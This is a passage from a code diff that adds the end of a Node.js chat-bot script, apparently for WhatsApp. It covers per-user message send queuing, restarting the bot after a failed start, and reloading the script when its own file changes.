+                return res;
+            }).catch(err => {
+                console.error(chalk.red('Send error:'), err.message);
+            })
+        );
+
+        return userQueues[jid];
+    };
+
+    return clutch;
+}
+
+startingBot().catch(err => {
+    console.error(chalk.red('Failed to start bot:'), err);
+    setTimeout(startingBot, 10000);
+});
+
+let file = require.resolve(__filename);
+fs.watchFile(file, () => {
+    fs.unwatchFile(file);
+    console.log(chalk.blue('Updated'), __filename);
+    delete require.cache[file];
+    require(file);
+});
